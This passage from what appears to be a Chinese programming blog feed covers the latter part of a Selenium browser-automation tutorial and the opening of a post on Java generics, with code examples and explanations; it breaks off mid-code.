  input.send_keys(&#39;Python&#39;)    input.send_keys(Keys.ENTER)    wait = WebDriverWait(browser, 10)    wait.until(EC.presence_of_element_located((By.ID, &#39;content_left&#39;)))    print(browser.current_url)    print(browser.get_cookies())    print(browser.page_source)finally:    browser.close()</code></pre><h3 id="2-声明对象"><a href="#2-声明对象" class="headerlink" title="2.声明对象"></a><strong>2.声明对象</strong></h3><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()browser = webdriver.Firefox()browser = webdriver.Edge()browser = webdriver.PhantomJS()browser = webdriver.Safari()</code></pre><h3 id="3-访问页面"><a href="#3-访问页面" class="headerlink" title="3.访问页面"></a><strong>3.访问页面</strong></h3><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&quot;https://www.baidu.com&quot;)print(browser.page_source)browser.close()</code></pre><h3 id="4-查找元素"><a href="#4-查找元素" class="headerlink" title="4.查找元素"></a><strong>4.查找元素</strong></h3><h4 id="1-查找单个元素"><a href="#1-查找单个元素" class="headerlink" title="(1)查找单个元素"></a><strong>(1)查找单个元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&#39;https://www.taobao.com&#39;)input_first = browser.find_element_by_id(&#39;q&#39;)input_second = browser.find_element_by_css_selector(&#39;#q&#39;)input_third = browser.find_element_by_xpath(&#39;//*[@id=&quot;q&quot;]&#39;)print(input_first, input_second, input_third)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;06448c4d710820390f33d87c3033a505&quot;, element=&quot;0.38405353494037175-1&quot;)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;06448c4d710820390f33d87c3033a505&quot;, element=&quot;0.38405353494037175-1&quot;)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;06448c4d710820390f33d87c3033a505&quot;, element=&quot;0.38405353494037175-1&quot;)&gt;</code></pre><blockquote><p><strong>补充：</strong></p><p>除此之外还有一些查找元素的方法，如下</p><pre><code class="hljs">find_element_by_namefind_element_by_xpathfind_element_by_link_textfind_element_by_partial_link_textfind_element_by_tag_namefind_element_by_class_namefind_element_by_css_selector</code></pre></blockquote><p><strong>实例代码二：</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.webdriver.common.by import Bybrowser = webdriver.Chrome()browser.get(&#39;https://www.taobao.com&#39;)input_first = browser.find_element(By.ID, &#39;q&#39;)print(input_first)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;1f209c0d11551c40d9d20ad964fef244&quot;, element=&quot;0.07914603542731591-1&quot;)&gt;</code></pre><h4 id="2-查找多个元素"><a href="#2-查找多个元素" class="headerlink" title="(2)查找多个元素"></a><strong>(2)查找多个元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&#39;https://www.taobao.com&#39;)lis = browser.find_elements_by_css_selector(&#39;.service-bd li&#39;)print(lis)browser.close()</code></pre><p><strong>实例代码二：</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.webdriver.common.by import Bybrowser = webdriver.Chrome()browser.get(&#39;https://www.taobao.com&#39;)lis = browser.find_elements(By.CSS_SELECTOR, &#39;.service-bd li&#39;)print(lis)browser.close()</code></pre><blockquote><p><strong>补充：</strong></p><p>除了上面的查找方法，查找多个元素还有下面的一些常见的方法：</p><p>find_elements_by_name find_elements_by_xpath<br>find_elements_by_link_text find_elements_by_partial_link_text<br>find_elements_by_tag_name find_elements_by_class_name<br>find_elements_by_css_selector</p></blockquote><h4 id="3-元素的交互操作"><a href="#3-元素的交互操作" class="headerlink" title="(3)元素的交互操作"></a><strong>(3)元素的交互操作</strong></h4><p>我们可以对获取的元素调用交互方法</p><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverimport timebrowser = webdriver.Chrome()browser.get(&quot;http://www.taobao.com&quot;)input = browser.find_element_by_id(&#39;q&#39;)input.send_keys(&#39;iphone&#39;)time.sleep(1)input.clear()input.send_keys(&#39;ipad&#39;)button = browser.find_element_by_class_name(&#39;btn-search&#39;)button.click()</code></pre><blockquote><p><strong>补充：</strong></p><p><strong>官方文档:</strong><br><a href="http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement">http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p></blockquote><h4 id="4-交互动作"><a href="#4-交互动作" class="headerlink" title="(4)交互动作"></a><strong>(4)交互动作</strong></h4><p>将动作附加到动作链中串行执行，这是我们使用 selenium 去模拟键鼠操作的非常常用的东西</p><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.webdriver import ActionChainsbrowser = webdriver.Chrome()url = &#39;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#39;browser.get(url)browser.switch_to.frame(&#39;iframeResult&#39;)source = browser.find_element_by_css_selector(&#39;#draggable&#39;)target = browser.find_element_by_css_selector(&#39;#droppable&#39;)actions = ActionChains(browser)actions.drag_and_drop(source, target)actions.perform()</code></pre><blockquote><p><strong>补充：</strong></p><p><strong>官方文档:</strong><br><a href="http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.common.action_chains">http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.common.action_chains</a></p><p><strong>ActionChains方法列表</strong><br>click(on_element&#x3D;None) ——单击鼠标左键<br>click_and_hold(on_element&#x3D;None) ——点击鼠标左键，不松开<br>context_click(on_element&#x3D;None) ——点击鼠标右键<br>double_click(on_element&#x3D;None) ——双击鼠标左键<br>drag_and_drop(source, target) ——拖拽到某个元素然后松开<br>drag_and_drop_by_offset(source, xoffset, yoffset) ——拖拽到某个坐标然后松开<br>key_down(value, element&#x3D;None) ——按下某个键盘上的键<br>key_up(value, element&#x3D;None) ——松开某个键<br>move_by_offset(xoffset, yoffset) ——鼠标从当前位置移动到某个坐标<br>move_to_element(to_element) ——鼠标移动到某个元素<br>move_to_element_with_offset(to_element, xoffset, yoffset)<br>——移动到距某个元素（左上角坐标）多少距离的位置<br>perform() ——执行链中的所有动作<br>release(on_element&#x3D;None) ——在某个元素位置松开鼠标左键<br>send_keys(*keys_to_send) ——发送某个键到当前焦点的元素<br>send_keys_to_element(element, *keys_to_send) ——发送某个键到指定元素</p></blockquote><h4 id="5-执行JavaScript"><a href="#5-执行JavaScript" class="headerlink" title="(5)执行JavaScript"></a><strong>(5)执行JavaScript</strong></h4><p>当我们找不到现成的 api 的时候，我们可以使用 js 来帮助我们实现一些动作，比如进度条的拖拽等</p><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&#39;https://www.zhihu.com/explore&#39;)browser.execute_script(&#39;window.scrollTo(0, document.body.scrollHeight)&#39;)browser.execute_script(&#39;alert(&quot;To Bottom&quot;)&#39;)browser.close()</code></pre><h3 id="5-获取元素信息"><a href="#5-获取元素信息" class="headerlink" title="5.获取元素信息"></a><strong>5.获取元素信息</strong></h3><h4 id="1-获取属性-1"><a href="#1-获取属性-1" class="headerlink" title="(1)获取属性"></a><strong>(1)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.webdriver import ActionChainsbrowser = webdriver.Chrome()url = &#39;https://www.zhihu.com/explore&#39;browser.get(url)logo = browser.find_element_by_id(&#39;zh-top-link-logo&#39;)print(logo)print(logo.get_attribute(&#39;class&#39;))browser.close()</code></pre><h4 id="2-获取文本值"><a href="#2-获取文本值" class="headerlink" title="(2)获取文本值"></a><strong>(2)获取文本值</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()url = &#39;https://www.zhihu.com/explore&#39;browser.get(url)input = browser.find_element_by_class_name(&#39;zu-top-add-question&#39;)print(input.text)browser.close()</code></pre><h4 id="3-获取ID、位置、标签名、大小"><a href="#3-获取ID、位置、标签名、大小" class="headerlink" title="(3)获取ID、位置、标签名、大小"></a><strong>(3)获取ID、位置、标签名、大小</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()url = &#39;https://www.zhihu.com/explore&#39;browser.get(url)input = browser.find_element_by_class_name(&#39;zu-top-add-question&#39;)print(input.id)print(input.location)print(input.tag_name)print(input.size)browser.close()</code></pre><h3 id="6-Frame-操作"><a href="#6-Frame-操作" class="headerlink" title="6.Frame 操作"></a><strong>6.Frame 操作</strong></h3><p>如果出现 frame 或者 iframe 我们必须要进入这个区域才能进行操作</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import timefrom selenium import webdriverfrom selenium.common.exceptions import NoSuchElementExceptionbrowser = webdriver.Chrome()url = &#39;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#39;browser.get(url)browser.switch_to.frame(&#39;iframeResult&#39;)source = browser.find_element_by_css_selector(&#39;#draggable&#39;)print(source)try:    logo = browser.find_element_by_class_name(&#39;logo&#39;)except NoSuchElementException:    print(&#39;NO LOGO&#39;)finally:    browser.close()browser.switch_to.parent_frame()logo = browser.find_element_by_class_name(&#39;logo&#39;)print(logo)print(logo.text)</code></pre><h3 id="7-等待"><a href="#7-等待" class="headerlink" title="7.等待"></a><strong>7.等待</strong></h3><h4 id="1-隐式等待"><a href="#1-隐式等待" class="headerlink" title="(1)隐式等待"></a><strong>(1)隐式等待</strong></h4><p>这个方法是针对网页中的 ajax 请求设计的，当 webdriver 查找元素或元素并没有立即出现的时候(可能还需要后期的 ajax 请求)，隐式等待将等待一段时间再查找 DOM，默认的时间是0</p><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()browser.implicitly_wait(10)browser.get(&#39;https://www.zhihu.com/explore&#39;)input = browser.find_element_by_class_name(&#39;zu-top-add-question&#39;)print(input)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;a607aed65e614d975de7a1273522ff3a&quot;, element=&quot;0.7555513559347986-1&quot;)&gt;</code></pre><h4 id="2-显式等待"><a href="#2-显式等待" class="headerlink" title="(2)显式等待"></a><strong>(2)显式等待</strong></h4><p>显示等待会设置一个条件和一个最长等待时间，如果在这个最长等待时间内条件还是没有成立才会抛出异常</p><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECbrowser = webdriver.Chrome()browser.get(&#39;https://www.taobao.com/&#39;)wait = WebDriverWait(browser, 10)input = wait.until(EC.presence_of_element_located((By.ID, &#39;q&#39;)))button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, &#39;.btn-search&#39;)))print(input, button)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;c3730876d29127a08cdcdb54a664600f&quot;, element=&quot;0.37070383186598255-1&quot;)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;c3730876d29127a08cdcdb54a664600f&quot;, element=&quot;0.37070383186598255-2&quot;)&gt;</code></pre><blockquote><p><strong>补充：</strong></p></blockquote><p><strong>常见的判断条件：</strong></p><blockquote><p>title_is 标题是某内容<br>title_contains 标题包含某内容<br>presence_of_element_located 元素加载出，传入定位元组，如(By.ID, ‘p’)<br>visibility_of_element_located 元素可见，传入定位元组<br>visibility_of 可见，传入元素对象<br>presence_of_all_elements_located 所有元素加载出<br>text_to_be_present_in_element 某个元素文本包含某文字<br>text_to_be_present_in_element_value 某个元素值包含某文字<br>frame_to_be_available_and_switch_to_it frame加载并切换<br>invisibility_of_element_located 元素不可见<br>element_to_be_clickable 元素可点击<br>staleness_of 判断一个元素是否仍在DOM，可判断页面是否已经刷新<br>element_to_be_selected 元素可选择，传元素对象<br>element_located_to_be_selected 元素可选择，传入定位元组<br>element_selection_state_to_be 传入元素对象以及状态，相等返回True，否则返回False<br>element_located_selection_state_to_be 传入定位元组以及状态，相等返回True，否则返回False<br>alert_is_present 是否出现Alert</p><p><strong>官方文档：</strong><br><a href="http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.support.expected_conditions">http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.support.expected_conditions</a></p></blockquote><h3 id="8-前进后退"><a href="#8-前进后退" class="headerlink" title="8.前进后退"></a><strong>8.前进后退</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriver browser = webdriver.Chrome()browser.get(&quot;http://www.baidu.com&quot;)browser.get(&quot;http://www.taobao.com&quot;)browser.get(&quot;http://www.zhihu.com&quot;)browser.back()browser.forward()browser.close()</code></pre><h3 id="9-Cookies"><a href="#9-Cookies" class="headerlink" title="9.Cookies"></a><strong>9.Cookies</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&#39;http://www.baidu.com&#39;)print(browser.get_cookies())browser.add_cookie(&#123;&#39;name&#39;:&#39;Tom&#39;,&#39;pass&#39;:&#39;123456&#39;,&#39;value&#39;: &#39;germey&#39;&#125;)print(browser.get_cookies())browser.delete_all_cookies()print(browser.get_cookies())browser.close()</code></pre><h3 id="10-选项卡操作"><a href="#10-选项卡操作" class="headerlink" title="10.选项卡操作"></a><strong>10.选项卡操作</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverimport timebrowser = webdriver.Chrome()browser.get(&#39;http://www.baidu.com&#39;)browser.execute_script(&#39;window.open()&#39;)print(browser.window_handles)browser.switch_to.window(browser.window_handles[1])browser.get(&#39;http://www.taobao.com&#39;)time.sleep(1)browser.switch_to.window(browser.window_handles[0])browser.get(&#39;http://httpbin.org&#39;)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&#39;CDwindow-3FCC47842DFF6841B4C86EE72CB7DB93&#39;, &#39;CDwindow-CCFA4494DE4B6C99494BE87524153E4E&#39;]</code></pre><h3 id="11-异常处理"><a href="#11-异常处理" class="headerlink" title="11.异常处理"></a><strong>11.异常处理</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.common.exceptions import TimeoutException, NoSuchElementExceptionbrowser = webdriver.Chrome()try:    browser.get(&#39;https://www.baidu.com&#39;)except TimeoutException:    print(&#39;Time Out&#39;)try:    browser.find_element_by_id(&#39;hello&#39;)except NoSuchElementException:    print(&#39;No Element&#39;)finally:    browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">No Element</code></pre><blockquote><p><strong>补充：</strong></p><p>官方文档：详细文档：<a href="http://selenium-python.readthedocs.io/api.html#module-selenium.common.exceptions">http://selenium-python.readthedocs.io/api.html#module-selenium.common.exceptions</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA 泛型、动态代理技术要点梳理</title>
    <link href="/2019/04/20/JAVA%20%E6%B3%9B%E5%9E%8B%E3%80%81%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%E6%A2%B3%E7%90%86/"/>
    <url>/2019/04/20/JAVA%20%E6%B3%9B%E5%9E%8B%E3%80%81%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%E6%A2%B3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近想写一点关于 Java 的东西，然后又遇见了 Java 中比较核心的几个技术，这几个技术贯穿整个 Java 的学习，也是后面各种框架的技术基础，因此深入理解这几种技术对我们后期分析各种框架是非常有帮助的，如果学的不精、不透，那么后面你分析各种漏洞的时候都会被绕进去，这也就是我对这些技术进行简单整理的原因。</p><h2 id="0X01-泛型"><a href="#0X01-泛型" class="headerlink" title="0X01 泛型"></a><strong>0X01 泛型</strong></h2><h3 id="1-什么是泛型"><a href="#1-什么是泛型" class="headerlink" title="1.什么是泛型"></a><strong>1.什么是泛型</strong></h3><p>泛型，即“参数化类型”，将类型定义成参数形式(形参)，使用的使用传入具体的类型(实参)，也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。</p><h3 id="2-泛型解决什么样的问题"><a href="#2-泛型解决什么样的问题" class="headerlink" title="2.泛型解决什么样的问题"></a><strong>2.泛型解决什么样的问题</strong></h3><pre><code class="hljs">List arrayList = new ArrayList();arrayList.add(&quot;aaaa&quot;);arrayList.add(100);for(int i = 0; i&lt; arrayList.size();i++)&#123;    String item = (String)arrayList.get(i);    Log.d(&quot;泛型测试&quot;,&quot;item = &quot; + item);&#125;</code></pre><p>这段代码是可以编译成功的，因为 arrayList 本身就可以存放任意类型的数据，但是运行时会报错，因为你使用的时候强制将 Integer 当做 String 类型使用，所以这样的特性并不利于我们代码的纠错与维护，我们希望在编译的时候就能给我们提示，于是泛型就应运而生</p><h3 id="3-泛型的生命周期"><a href="#3-泛型的生命周期" class="headerlink" title="3.泛型的生命周期"></a><strong>3.泛型的生命周期</strong></h3><p>为了更好地使用泛型，我们首先要知道泛型的生命周期只在编译阶段有效，也就是说泛型是提供给Javac编译器看的，可以限定集合中的输入类型，让编译器挡住源程序中的非法输入，在正确检验泛型结果后，会将泛型的相关信息抹去。</p><p><strong>代码实例：</strong></p><pre><code class="hljs">ArrayList&lt;String&gt; collection2 = new ArrayList&lt;String&gt;();ArrayList&lt;Integer&gt; collection3 = new ArrayList&lt;Integer&gt;();//对于参数化的泛型类型，getClass()方法的返回值和原始类型完全一样System.out.println(collection3.getClass());//结果为：java.util.ArrayListSystem.out.println(collection3.getClass() == collection2.getClass());//结果为true</code></pre><p>也就是说我们能绕过编译器的眼睛，来往 arrayList 里面添加其他类型数据</p><p><strong>代码实例：</strong></p><pre><code class="hljs">//使用反射得到集合，然后调用add方法往原本只能存储Integer对象的集合中存储一个String类型的对象collection3.getClass().getMethod(&quot;add&quot;, Object.class).invoke(collection3, &quot;abc&quot;);System.out.println(collection3.get(0));//输出的结果为：abc，这证明字符串对象确实是存储到了原本只能存储Integer对象的集合中</code></pre><h3 id="4-泛型的使用"><a href="#4-泛型的使用" class="headerlink" title="4.泛型的使用"></a><strong>4.泛型的使用</strong></h3><h4 id="1-泛型类"><a href="#1-泛型类" class="headerlink" title="(1)泛型类"></a><strong>(1)泛型类</strong></h4><p>泛型类型用于类的定义中，被称为泛型类。通过泛型可以完成对一组类的操作对外开放相同的接口。最典型的就是各种容器类，如：List、Set、Map。</p><p><strong>基本格式：</strong></p><pre><code class="hljs">class 类名称 &lt;泛型标识：可以随便写任意标识号，标识指定的泛型的类型&gt;&#123;  private 泛型标识 /*（成员变量类型）*/ var;   .....  &#125;&#125;</code></pre><p><strong>代码实例：</strong></p><p><strong>Generic.java</strong></p><pre><code class="hljs">//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型//在实例化泛型类时，必须指定T的具体类型public class Generic&lt;T&gt;&#123;    //key这个成员变量的类型为T,T的类型由外部指定    private T key;    public Generic(T key) &#123; //泛型构造方法形参key的类型也为T，T的类型由外部指定        this.key = key;    &#125;    public T getKey()&#123; //泛型方法getKey的返回值类型为T，T的类型由外部指定        return key;    &#125;&#125;</code></pre><p><strong>Main.java</strong></p><pre><code class="hljs">import java.lang.*;public class Main &#123;    public static void main(String[] args) &#123;        //泛型的类型参数只能是类类型（包括自定义类），不能是简单类型        //传入的实参类型需与泛型的类型参数类型相同，即为Integer.        Generic&lt;Integer&gt; genericInteger = new Generic&lt;Integer&gt;(123456);        //传入的实参类型需与泛型的类型参数类型相同，即为String.        Generic&lt;String&gt; genericString = new Generic&lt;String&gt;(&quot;key_vlaue&quot;);        //不传入任何的泛型类型参数        Generic generic = new Generic(&quot;111111&quot;);        Generic generic1 = new Generic(4444);        Generic generic2 = new Generic(55.55);        Generic generic3 = new Generic(false);        System.out.println(&quot;泛型测试 key is &quot; + genericInteger.getKey());        System.out.println(&quot;泛型测试 key is &quot; + genericString.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic1.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic2.getKey());        System.out.println(&quot;泛型测试 key is &quot; + generic3.getKey());    &#125;&#125;</code></pre><p><strong>输出结果：</strong></p><pre><code class="hljs">泛型测试 key is 123456泛型测试 key is key_vlaue泛型测试 key is 111111泛型测试 key is 4444泛型测试 key is 55.55泛型测试 key is false</code></pre><p>从上面的例子我们可以看到，定义的泛型类，并不一定要传入泛型类型实参，在使用泛型的时候如果传入泛型实参，则会根据传入的泛型实参做相应的限制，此时泛型才会起到本应起到的限制作用。如果不传入泛型类型实参的话，在泛型类中使用泛型的方法或成员变量定义的类型可以为任何的类型。但是实际上这样是不推荐的，因为编辑器会有一个警告，如下图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JAVA%20%E6%B3%9B%E5%9E%8B%E3%80%81%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%E6%A2%B3%E7%90%861.png" alt="此处输入图片的描述"></p><p><strong>一些补充：</strong></p><p><strong>(1)参数化类型与原始类型的兼容性：</strong></p><ul><li><p>参数化类型可以引用一个原始类型的对象，编译时编译器会报警告，例如：<code>Collection&lt;String&gt;</code> c &#x3D; new Vector();</p></li><li><p>原始类型可以引用一个参数化类型的对象，编译时编译器会报警告，例如：Collection c &#x3D; new <code>Vector&lt;String&gt;()</code>;</p></li><li><p>参数化类型不考虑类型参数的继承关系：<br><code>Vector&lt;String&gt;</code> v &#x3D; new <code>Vector&lt;Object&gt;()</code>;&#x2F;&#x2F;错误，语法上不通过<br><code>Vector&lt;Object&gt;</code> v &#x3D; new <code>Vector&lt;String&gt;()</code>;&#x2F;&#x2F;错误，语法上不通过</p></li><li><p>假设 <code>Vector&lt;String&gt;</code> v &#x3D; new <code>Vector&lt;Object&gt;</code>;可以的话，那么以后从v中取出的对象当作String用，而v实际指向的集合中可以加入任意类型的对象，</p></li><li><p>假设 <code>Vector&lt;Object&gt;</code> v &#x3D; new <code>Vector&lt;String&gt;</code>;可以的话，那么以后可以向v中加入任意类型的对象，而v实际指向的集合中只能装String类型的对象</p></li></ul><p><strong>(2)思考：下面的代码会报错吗？（不会报错）</strong></p><p>Vector v1 &#x3D; new <code>Vector&lt;String&gt;()</code>;&#x2F;&#x2F;参数化类型的对象可以给原始类型的引用<br><code>Vector&lt;Object&gt;</code> v&#x3D;v1;&#x2F;&#x2F;参数化类型的引用可以指向原始类型的对象</p><h4 id="2-泛型接口"><a href="#2-泛型接口" class="headerlink" title="(2)泛型接口"></a><strong>(2)泛型接口</strong></h4><p>泛型接口与泛型类的定义及使用基本相同。泛型接口常被用在各种类的生产器中，可以看一个例子：</p><pre><code class="hljs">//定义一个泛型接口public interface Generator&lt;T&gt; &#123;    public T next();&#125;</code></pre><p>当实现泛型接口的类，未传入泛型实参时，与泛型类的定义相同，在声明类的时候，需将泛型的声明也一起加到类中</p><p>即：class <code>FruitGenerator&lt;T&gt;</code> implements Generator<T>{…}如果不声明泛型，如：class FruitGenerator implements <code>Generator&lt;T&gt;</code>，编译器会报错：”Unknown class”</p><pre><code class="hljs">class FruitGenerator&lt;T&gt; implements Generator&lt;T&gt;&#123;    @Override    public T next() &#123;        return null;    &#125;&#125;</code></pre><p>当实现泛型接口的类，传入泛型实参时：定义一个生产器实现这个接口,虽然我们只创建了一个泛型接口<code>Generator&lt;T&gt;</code>但是我们可以为T传入无数个实参，形成无数种类型的Generator接口。在实现类实现泛型接口时，如已将泛型类型传入实参类型，则所有使用泛型的地方都要替换成传入的实参类型,即：<code>Generator&lt;T&gt;</code>，public T next();中的的T都要替换成传入的String类型。</p><pre><code class="hljs">public class FruitGenerator implements Generator&lt;String&gt; &#123;    private String[] fruits = new String[]&#123;&quot;Apple&quot;, &quot;Banana&quot;, &quot;Pear&quot;&#125;;    @Override    public String next() &#123;        Random rand = new Random();        return fruits[rand.nextInt(3)];    &#125;&#125;</code></pre><h4 id="3-泛型通配符”-”"><a href="#3-泛型通配符”-”" class="headerlink" title="(3)泛型通配符”?”"></a><strong>(3)泛型通配符”?”</strong></h4><p>首先我们要明确一点，那就是泛型之间是不存在类型兼容性的，比如说，Ingeter是Number的一个子类，但是在使用 <code>Generic&lt;Number&gt;</code>作为形参的方法中，是不能使用<code>Generic&lt;Ingeter&gt;</code>的实例传入的，换句话说 <code>Generic&lt;Integer&gt;</code> 不能被看作为<code>Generic&lt;Number&gt;</code>的子类</p><p><strong>代码实例：</strong></p><pre><code class="hljs">public void showKeyValue1(Generic&lt;Number&gt; obj)&#123;    System.out.println(&quot;泛型测试 key value is &quot; + obj.getKey());&#125;Generic&lt;Integer&gt; gInteger = new Generic&lt;Integer&gt;(123);Generic&lt;Number&gt; gNumber = new Generic&lt;Number&gt;(456);showKeyValue(gInteger);</code></pre><p>showKeyValue这个方法编译器会为我们报错：<code>Generic&lt;java.lang.Integer&gt;</code> cannot be applied to <code>Generic&lt;java.lang.Number&gt;</code> showKeyValue(gInteger);</p><p>因此我们需要一个在逻辑上可以表示同时是 <code>Generic&lt;Integer&gt;</code> 和 <code>Generic&lt;Number&gt;</code> 父类的引用类型,我们对上面的方法进行如下修改</p><pre><code class="hljs">public void showKeyValue1(Generic&lt;?&gt; obj)&#123;    System.out.println(&quot;泛型测试 key value is &quot; + obj.getKey());&#125;</code></pre><blockquote><p><strong>注意：</strong></p><p>1.这里的 “?” 代替具体的类型<strong>实参</strong>，和Number、String、Integer一样都是一种实际的类型，可以把”?看成所有类型的父类。</p><p>2.可以解决当具体类型不确定的时候，这个通配符就是 “?” 当操作类型时，不需要使用类型的具体功能时，只使用Object类中的功能。那么可以用 “?” 通配符来表未知类型。</p></blockquote><h4 id="4-泛型方法"><a href="#4-泛型方法" class="headerlink" title="(4)泛型方法"></a><strong>(4)泛型方法</strong></h4><h5 id="1-类比泛型类解释泛型方法"><a href="#1-类比泛型类解释泛型方法" class="headerlink" title="1.类比泛型类解释泛型方法"></a><strong>1.类比泛型类解释泛型方法</strong></h5><p>泛型类，是在实例化类的时候指明泛型的具体类型，而泛型方法，是在调用方法的时候指明泛型的具体类型。</p><p><strong>实例代码：</strong></p><pre><code class="hljs">public &lt;T&gt; T genericMethod(Class&lt;T&gt; tClass)throws InstantiationException ,  IllegalAccessException&#123;        T instance = tClass.newInstance();        return instance;&#125;Object obj = genericMethod(Class.forName(&quot;com.test.test&quot;));</code></pre><p><strong>解释：</strong></p><p> 1）public 与 返回值中间<code>&lt;T&gt;</code>非常重要，可以理解为声明此方法为泛型方法。<br> 2）只有声明了<code>&lt;T&gt;</code>的方法才是泛型方法，泛型类中的使用了泛型的成员方法并不是泛型方法。<br> 3）<T>表明该方法将使用泛型类型T，此时才可以在方法中使用泛型类型T。<br> 4）与泛型类的定义一样，此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型。</p><h5 id="2-泛型方法的基本使用"><a href="#2-泛型方法的基本使用" class="headerlink" title="2.泛型方法的基本使用"></a><strong>2.泛型方法的基本使用</strong></h5><pre><code class="hljs">public class GenericTest &#123;   //这个类是个泛型类，在上面已经介绍过   public class Generic&lt;T&gt;&#123;             private T key;        public Generic(T key) &#123;            this.key = key;        &#125;        //我想说的其实是这个，虽然在方法中使用了泛型，但是这并不是一个泛型方法。        //这只是类中一个普通的成员方法，只不过他的返回值是在声明泛型类已经声明过的泛型。        //所以在这个方法中才可以继续使用 T 这个泛型。        public T getKey()&#123;            return key;        &#125;        /**         * 这个方法显然是有问题的，在编译器会给我们提示这样的错误信息&quot;cannot reslove symbol E&quot;         * 因为在类的声明中并未声明泛型E，所以在使用E做形参和返回值类型时，编译器会无法识别。        public E setKey(E key)&#123;             this.key = keu        &#125;        */    &#125;        /**          * 这才是一个真正的泛型方法。         * 首先在public与返回值之间的&lt;T&gt;必不可少，这表明这是一个泛型方法，并且声明了一个泛型T         * 这个T可以出现在这个泛型方法的任意位置.         * 泛型的数量也可以为任意多个          *    如：public &lt;T,K&gt; K showKeyName(Generic&lt;T&gt; container)&#123;         *        ...         *        &#125;         */        public &lt;T&gt; T showKeyName(Generic&lt;T&gt; container)&#123;            System.out.println(&quot;container key :&quot; + container.getKey());            //当然这个例子举的不太合适，只是为了说明泛型方法的特性。            T test = container.getKey();            return test;        &#125;    &#125;&#125;</code></pre><h5 id="3-泛型类中泛型方法的使用"><a href="#3-泛型类中泛型方法的使用" class="headerlink" title="3.泛型类中泛型方法的使用"></a><strong>3.泛型类中泛型方法的使用</strong></h5><pre><code class="hljs">public class GenericFruit &#123;    class Fruit&#123;        @Override        public String toString() &#123;            return &quot;fruit&quot;;        &#125;    &#125;    class Apple extends Fruit&#123;        @Override        public String toString() &#123;            return &quot;apple&quot;;        &#125;    &#125;    class Person&#123;        @Override        public String toString() &#123;            return &quot;Person&quot;;        &#125;    &#125;    class GenerateTest&lt;T&gt;&#123;        public void show_1(T t)&#123;            System.out.println(t.toString());        &#125;        //在泛型类中声明了一个泛型方法，使用泛型E，这种泛型E可以为任意类型。可以类型与T相同，也可以不同。        